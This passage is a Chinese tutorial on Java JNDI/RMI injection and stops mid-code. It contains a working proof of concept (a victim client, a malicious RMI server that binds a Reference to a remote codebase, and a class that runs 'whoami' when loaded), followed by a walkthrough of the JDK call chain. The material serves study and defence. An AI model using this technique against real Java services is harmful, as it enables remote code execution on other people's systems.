## 前言
本篇讲述了RMI-JNDI注入的利用原理，分析了利用流程；  
使用了marshalsec反序列化工具去简单的起一个RMI/LDAP服务端  
对于导致JNDI注入的漏洞代码扩展至com.sun.rowset.JdbcRowSetImpl函数，为fastjson反序列化起一个引子，准备新起一文。  
分析了java版本变化对于JNDI注入的影响  
引出了1.8u191之后的版本该如何利用JNDI注入，准备新起一文。  
提到了LDAP-JNDI注入
## JNDI
Java命名和目录接口（JNDI）是一种Java API，类似于一个索引中心，它允许客户端通过name发现和查找数据和对象。  
其应用场景比如：动态加载数据库配置文件，从而保持数据库代码不变动等。  
代码格式如下：
    String jndiName= ...;//指定需要查找name名称
    Context context = new InitialContext();//初始化默认环境
    DataSource ds = (DataSourse)context.lookup(jndiName);//查找该name的数据
这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），通用对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）。（此篇中我们将着重讲解RMI，提到LDAP）
RMI格式:
    InitialContext var1 = new InitialContext();
    DataSource var2 = (DataSource)var1.lookup("rmi://127.0.0.1:1099/Exploit");
## JNDI注入
所谓的JNDI注入就是当上文代码中jndiName这个变量可控时，引发的漏洞，它将导致远程class文件加载，从而导致远程代码执行。
我们看一个利用RMI的POC，忘记从哪里收集的了。然后分析一下调用的流程。
### poc验证
ClIENT.java（受害者）
    package jndi注入;
    import javax.naming.Context;
    import javax.naming.InitialContext;
    public class CLIENT {
        public static void main(String[] args) throws Exception {
            String uri = "rmi://127.0.0.1:1099/aa";
            Context ctx = new InitialContext();
            ctx.lookup(uri);
        }
    }
SERVER.java(攻击者部署)
    package jndi注入;
    import com.sun.jndi.rmi.registry.ReferenceWrapper;
    import javax.naming.Reference;
    import java.rmi.registry.Registry;
    import java.rmi.registry.LocateRegistry;
    public class SERVER {
        public static void main(String args[]) throws Exception {
            Registry registry = LocateRegistry.createRegistry(1099);
            Reference aa = new Reference("ExecTest", "ExecTest", "http://127.0.0.1:8081/");
            ReferenceWrapper refObjWrapper = new ReferenceWrapper(aa);
            System.out.println("Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/aa'");
            registry.bind("aa", refObjWrapper);
        }
    }
ExecTest.java(攻击者部署)
    import java.io.BufferedReader;
    import java.io.IOException;
    import java.io.InputStream;
    import java.io.InputStreamReader;
    import java.io.Reader;
    import javax.print.attribute.standard.PrinterMessageFromOperator;
    public class ExecTest {
        public ExecTest() throws IOException,InterruptedException{
            String cmd="whoami";
            final Process process = Runtime.getRuntime().exec(cmd);
            printMessage(process.getInputStream());;
            printMessage(process.getErrorStream());
            int value=process.waitFor();
            System.out.println(value);
        }
        private static void printMessage(final InputStream input) {
            // TODO Auto-generated method stub
            new Thread (new Runnable() {
                @Override
                public void run() {
                    // TODO Auto-generated method stub
                    Reader reader =new InputStreamReader(input);
                    BufferedReader bf = new BufferedReader(reader);
                    String line = null;
                    try {
                        while ((line=bf.readLine())!=null)
                        {
                            System.out.println(line);
                        }
                    }catch (IOException  e){
                        e.printStackTrace();
                    }
                }
            }).start();
        }
    }
编译成class文件：`javac ExecTest.java`  
部署在web服务上：`py -3 -m http.server 8081`
运行SERVER  
运行CLIENT
> 把ExecTest.java及其编译的文件放到其他目录下，不然会在当前目录中直接找到这个类。不起web服务也会命令执行成功。  
>  ExecTest.java文件不能申明包名，即package xxx。声明后编译的class文件函数名称会加上包名从而不匹配。  
>
> java版本小于1.8u191。之后版本存在trustCodebaseURL的限制，只信任已有的codebase地址，不再能够从指定codebase中下载字节码。
### 分析调用流程
整体调用栈如下：
`InitialContext.java`
    public Object lookup(String name) throws NamingException {
            //getURLOrDefaultInitCtx函数会分析name的协议头返回对应协议的环境对象，此处返回Context对象的子类rmiURLContext对象
            //然后在对应协议中去lookup搜索，我们进入lookup函数
            return getURLOrDefaultInitCtx(name).lookup(name);
        }
`GenericURLContext.java`
    //var1="rmi://127.0.0.1:1099/aa"
    public Object lookup(String var1) throws NamingException {
        //此处this为rmiURLContext类调用对应类的getRootURLContext类为解析RMI地址
        //不同协议调用这个函数，根据之前getURLOrDefaultInitCtx(name)返回对象的类型不同，执行不同的getRootURLContext
        //进入不同的协议路线
        ResolveResult var2 = this.getRootURLContext(var1, this.myEnv);//获取RMI注册中心相关数据
        Context var3 = (Context)var2.getResolvedObj();//获取注册中心对象
        Object var4;
        try {
            var4 = var3.lookup(var2.getRemainingName());//去注册中心调用lookup查找，我们进入此处，传入name-aa
        } finally {
            var3.close();
        }
        return var4;
    }
`RegistryContext.java`：
    //传入var1=aa
    public Object lookup(Name var1) throws NamingException {
        if (var1.isEmpty()) {
            return new RegistryContext(this);
        } else {//判断来到这里
            Remote var2;
            try {
                var2 = this.registry.lookup(var1.get(0));//RMI客户端与注册中心通讯，返回RMI服务IP，地址等信息
            } catch (NotBoundException var4) {
                throw new NameNotFoundException(var1.get(0));
            } catch (RemoteException var5) {
                throw (NamingException)wrapRemoteException(var5).fillInStackTrace();
            }
            return this.decodeObject(var2, var1.getPrefix(1));//我们进入此处
        }
    }
`RegistryContext.java`：
    private Object decodeObject(Remote var1, Name var2) throws NamingException {
            try {
                //注意到上面的服务端代码，我们在RMI服务端绑定的是一个Reference对象，世界线在这里变动
                //如果是Reference对象会，进入var.getReference()，与RMI服务器进行一次连接，获取到远程class文件地址。
                //如果是普通RMI对象服务，这里不会进行连接，只有在正式远程函数调用的时候才会连接RMI服务。
                Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1;
                return NamingManager.getObjectInstance(var3, var2, this, this.environment);
                //获取reference对象进入此处
            } catch (NamingException var5) {
                throw var5;
            } catch (RemoteException var6) {
                throw (NamingException)wrapRemoteException(var6).fillInStackTrace();
            } catch (Exception var7) {
                NamingException var4 = new NamingException();
                var4.setRootCause(var7);
                throw var4;
            }
        }
    }
`NamingManager.java` 截取部分有用的代码
    //传入Reference对象到refinfo
    public static Object
        getObjectInstance(Object refInfo, Name name, Context nameCtx,
                            Hashtable environment)
        throws Exception
    {
            // Use builder if installed
        ...
        // Use reference if possible
        Reference ref = null;
        if (refInfo instanceof Reference) {//满足
            ref = (Reference) refInfo;//复制
        } else if (refInfo instanceof Referenceable) {//不进入
            ref = ((Referenceable)(refInfo)).getReference();
        }
        Object answer;
        if (ref != null) {//进入此处
            String f = ref.getFactoryClassName();//函数名 ExecTest
            if (f != null) {
                //任意命令执行点1（构造函数、静态代码），进入此处
                factory = getObjectFactoryFromReference(ref, f);
                if (factory != null) {
                    //任意命令执行点2（覆写getObjectInstance），
                    return factory.getObjectInstance(ref, name, nameCtx,
                                                        environment);
                }
                return refInfo;
            } else {
                // if reference has no factory, check for addresses
                // containing URLs
                answer = processURLAddrs(ref, name, nameCtx, environment);
                if (answer != null) {
                    return answer;
                }
            }
        }
`NamingManager.java`
    static ObjectFactory getObjectFactoryFromReference(
        Reference ref, String factoryName)
        throws IllegalAccessException,
        InstantiationException,
        MalformedURLException {
        Class clas = null;
        //尝试从本地获取该class
        try {